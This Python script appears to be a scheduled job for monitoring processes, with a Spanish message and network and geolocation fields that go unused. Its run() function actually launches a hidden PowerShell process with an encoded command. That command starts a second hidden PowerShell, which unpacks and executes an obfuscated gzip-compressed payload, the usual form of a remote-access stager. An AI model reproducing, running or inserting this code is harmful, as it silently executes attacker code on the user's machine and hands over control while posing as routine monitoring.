# 3@@run@@5@@Job 1@@win@@*
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
# [Code][Methodo By Run][Interval][Job Name][OS Type][Target Machine] ###
from enum import Enum


class Process(object):
    def __init__(self):
        self.Protocolo = 0
        self.RemoteAddress = ""
        self.Status = ""
        self.PID = ""
        self.ProgramName = ""
        self.As = ""
        self.City = ""
        self.Country = ""
        self.CountryCode = ""
        self.ISP = ""
        self.Latitud = ""
        self.Longitud = ""
        self.Organization = ""
        self.Region = ""
        self.RegionName = ""
        self.ZIP = ""


def run():
    import psutil
    import os
    import sys
    import time
    from datetime import datetime
    import json
    import subprocess

    def shell(command):
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        return out

    class Trace(object):
        def __init__(self,):
            self.Items = []
            self.Message = ""
            self.Severity = "NotAssigned"
            self.Successfully = False
            self.URL = ""
            self.IP = ""
            self.JobId = 0

        def ConvertToJSON(self):
            return json.dumps(self, default=lambda o: o.__dict__,
                              sort_keys=True, indent=4)

    result = Trace()
    result.CreateDate = datetime.utcnow().strftime('%Y/%m/%d %H:%M:%S:%f')
    result.Message = "Processo de monitoreo de jobs"
    try:
        command = "powershell.exe@@-nop@@-w@@hidden@@-e@@aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEARABRAFQAUgAxAHcAQwBBADcAVgBXACsAMAAvAGIAUwBCAEQAKwBHAFMAVAArAEIANgB1AEsAWgBGAHUARQBPAEkAWQBVAFcAcQBSAEsAdAA4ADQANwBqAFMASABCADUARQBVAGEAbgBSAFoANwBiAFcAOQBZADIAOABsADYASABVAGgANgAvAGQAOQB2AE4AbwBrAHAAcQBQAFMAdQBQAGUAbQBzAFAAUABZAHgATQB6AHYAegB6AFQAZQB6ADkAcgBQAFkARgBUAFMASgBGAFYASABOAGwASwA5AEgAaAB3AGMAOQB6AEgARwBrAGEAQQBXAC8AVwAxAFEASwAvAEgAVAAxADMAdABVAFAARABtAEMAOQBrAEgAcABZACsAYQBSAG8AVQA3AFIAWQAxAEoASQBJADAAMwBoADIAZQBWAG4ATgBPAEMAZQB4ADIATQAxAEwAVABTAEoAUQBtAHAATABvAG4AbABHAFMAYQByAHIAeQBsAHoASQBLAEMAUwBjAG4AMQAvAGQAegA0AGcAcgBsAHEAMQBMADQAcwA5AFIAawB5AFQAMQBtAGUANwBGADEARgBiAHMAaABVAFUANQBRADcATQBtADkAYgB1AEoAaQA2AFUAdgBKAFcAVABBAHEATgBQAFgATABGADEAVwBmAG4AcABpAHoAVQBuADIAWgBZAFoAWgBxAHEAcgBOAE8AQgBZAGwASwBIAG0ATwBxAHIAbgB6AFQANQBZAEcAMwA2AHcAWABSAFYASgB1ADYAUABFAGsAVABYADUAUgBHAE4ARAA0ADcATABRADMAaQBGAFAAdgBrAEMAcQB5AHQAaQBFADEARQBtAEgAaQBwAHEAawBNAFEAOABPAEYARQBaAEQAeABXAFoARABoAFMAZgA3AGUAcgBxAFQARABzADgAYwBSAEYAbgBzAGQASgBtAHEAcABGAFoAUwBvAHQAVAAyAGUAegBQADcAVABwAC8AdABpAGIATABCAFkAMABJAHEAVgAyAEwAQQBoAFAARgBnADcAaABLACsAcQBTAHQATgBUAEMAcwBjAGYASQBEAGYARgBuAG8ATwBVAEkAVAB1AE4AZwBwAHUAcwBnAHQAawBvAGUAaQBGAGEASQBNADgAYQBLAHkAdQArAFkAMABhADcASQBZAHcANwBhAHIAeQBwAHAATAA1AFYAQQBxAGkAZQA0AFgAbwBRADAALwBoAGkAbQBuAFgAZwBaAEkAegB0AEYAOQBRADAALwBJAGYATQA2AFAATQAvAFoAQgA5AHkAKwBIAFIAMABlAEgAZgBvADUAVQA1AGIAUgBLADYAYgBBADYARwBDADYASABSAFAAdwBUAGUAcwBsAEsAZAAyAEsAZgBWAEwASwBSAGMAVwBHAFkANwBCAEkAKwBCAHEAbQBoAFYAdQBlAEUAWAAzADIAagBLAHgAUwBjAE0AMwBpAHoANwBYAE4AWABCAFEARQBRADkATQBlAFUAbABpAGIARABoAFAAcQB6AFUAQgBuAG4AOAB6AEMAbwBpADUAWABmADAANwBKAEcAdgBGAHAAVABHAHIAcgBHAEUAZgBVAHoAVgBtAG4AdgBRAFUAdwA4AFIAbgBaAHgAbABmAEsAeABhADcAQQBKADAAMwBkAGIAeABDAHYAUgBoAGcASgBzAEoAQwBZAHkAVAB6AC8AbwBGAGEAUABxAEgAagBXAHQAVABMAEsAUABNAEsAUgBDADAAbABLAHcAUwB2AEkAbgAvADcAYQBtAFYAMABhAE4ATABVAGQAMgB5AFEAQwBnAEgAWgB6AEkARgA3AEIAQgA2ADYAVABYAEgAcgBQADcAMwBWACsAdQBwAHkARABrAEYAcABsAE8ARQAyAEwAUwBpACsARABZAG4ATwBMAGkAawBNAHcASQAxADUAUgBRAFgARgBLADkAMQBzAG8ARQA4AGwAMgBxAEgANQAzADEAOAA2AFkAbwBDADUATwBSAFcANQB1AHAAdQA5AFEAMwBKADkAVwBUAGUASgBVADgATQB5AEYAagBFAEgAawB0ADgANgBDAHUAQgBRAHoAQwBVAFIAUgBhAFYARwBQAFcARwB1AEgAQgB2AG0AcAA2AHAAcwB3AFYARABGAGoAVQBBAEYAZwBhAFEAVgBwAGcAQgBVAFoAdgBpAE0AawBEAHoAZwA0AEMARABuAFgAUwB3ADQAUgA3AFcAagBCAFMAQQBRAFMAMgA0AHAAdgBNAEIAeABBAGYAZQA5AFoAdgBxAFUATgBEAG8AaQBuAHYAdgBZAHUASgAvAEcATwBzAFIASwBGAFAAUAB3AFgAdgBrAEYAcQBIAFoAYQBJAG8AagBLAGsAWABFAEQAYgBrAEkAaAB1ADYAZgBOAGYAegBuADcAUgBMADgAQwBMAEsAaQBmADcARABHAGgANQBVAFUAeQB0AHQAWgBCAGMATABwAEEAbwBHADYAdwBrAEYALwBlAEkAYgBPAFAAbgBBAG0ASgB2ADgAQwBTAHkAYwBFAHIATwBLADcAdgBlAG8ATAAwAHoAcgBtAGsAVgB3AFQATgBwAHgAOAB4ADIAcgBRAGQAcQBvAGsAZABxAHQAbQAzADQARAB1AGgAWgBPADYAbABkAGUASgA4ADcAOAA1AGIAQgBhADAAKwBoAGoAOQBwAHAAMgAyADcAMQBhAHYAMQBXAHEANwBMAHEATwBNAE8ASwBjAE8AcAB0ADgAYgBuAFgARgBuAFoAOQBQAEoAOAA3AHEASABVAHoAbQBJAGkANwBOAG0AcgBkADAAdgBMAEQAcABMAEoAWgBkAE8AagBHADYAUwBKAHYAOABtAFMAYwBiADYAegBOAFkAOQBsADYAMgBzAHcARAB6ADUALwBVAGYARAArADQAOABKADAAYgA4ADMAMgBEAGQAawBmAFYAdgBsAFUAKwB4AGQAMQBhAFAAZQB1AE8AcgBFAGUAcgBYAEUAbgByADkATABIAFYAcAA0AFAAKwBRADYAYwBoADcAaQBkAEQAaABnAGUAKwBFAFkAegBOAGoANQBnACsAZABmAGwAOABhAEMAYgAyAHAAbwAxAFEATQB6AHgAegBOAHgAMQAvADIAQQB4AHQAYgB6ADEAcABVAFQASQAzAHkAbAAzAGEAUgAzADIARQBQAHIAcwAzAGcAMABFAHoAVwBBAFQATgBGAEIAawBmAGgAOAB0AHEAUgBNAC8AVAAwAGIASwBIAFUAUgB2AFYAegBxAHUAZAA5ADgAegBxAEQAeABvAFcARwB0AFMAdABQAHIANQBPAGUAbQBmAEgATgBjAE8AOAA4ADUAYgAxAHgAdAAwAFkAZAB5AEwAbQBOAFYAdQBHAE8AUgBrAGoARAAzAEgAagBOAGcAagBOAGkAKwBzAHcAbABqAGoAaAB3AEYAcABhAFUAZwBaADEANwA5AFkATgBBADIAUgA2AEYAZABTAHEAbgBOAEwATgAzAGIATABmAEQARgBBAGQAWgBJAFoAUgBnAG4AQwBEAFAAZwB5AE8AeAAyAEQAegA2AGgAWgAwAFIAZwBQAFQAUwA1AEMASQAyADIAUABEAEcAQQBaAEcAZwBIAHcAbgBuAEcAQgBrAGcAYgBTADEAUgBBADAAcgBxAGEANAAvADkATwB5AGUATQBSAHkAZQBoAHUAYgA5AGcAeABtAEMAegAyAFMAOAArAG0AQgAzADAASABIAEQANwBSAG0ARwBjAFIAegBkAHcANgArAEIAWABIAHYAeABGAEkAKwB0AHgANAB2AFYAbwA4AEMAZABFAGQAaQArAE4AVAA0AE8AUAByADIAVABGAEEARwBPAEYAUABnAHkAZQBaAEgANgBuAC8AVgBxAEcALwBNADAAeABBAHcAbwBBAFYAMAA0AEwAOABCAEcAdwBoAHYANwB4AHQAcABMAHEATgBUAFEATgBIAGsAVgBQAHgAQQBlAEUAdwBaAFgARwBWAHgAMgBPAFoAVQBSAFkANABrAHIAdQA3AHIAcwB3AEgAQwBoADcATgBxADgAdgBIAFUARwBNAEQAdwA3AGYAWABPAGsASwA4ACsAQwArAHYAZAB1AG4AeQA5AGQAWAB0ADYAQgBqADEAQQBhAFcALwA2AFcAdQBpAFEATwBSAEYAZwBzAFAANQAyAFYAeQA5AEMAOQB5ADAAKwBWAE0AcwBUADQANgA0AEYAVgBrADgAVgBhADIAOQBrAHEAeQB2AFkAdgBrAFgAawAyAHoAcgBiAEcAZABWAGsAMgBoAFUAMgByAEUAZgAyAHYAawBPADEAcgBOAFkAUQAvADcAMQA4AGcAKwA3ADcAMgBEADcAdQAvAEIARwBPADUAdQBBADMANABoADkAWABYAEMANwArAEYANgBPAC8ARwBQAGMASgBVAGcASwBBAEQAagBZAGEAUgAzAFIAWAAzAFoAdgBoADcAYwByAHkANAAvADIAVgBLAEkAUABQACsALwBwAEcAdgBiADkAZQBaAE8ATABtAEMAMQA0AEsAagB3ADcAOABCADkAWQByAGcAaAB5AGMASwBBAEEAQQA9ACcAJwApACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
        shell(command.split('@@'))
        result.Successfully = True
    except Exception as e:
        print("Ocurrio un error ", str(e))
        result.Successfully = False

    return result


if __name__ == "__main__":
    ddd = run()
    varr = ddd
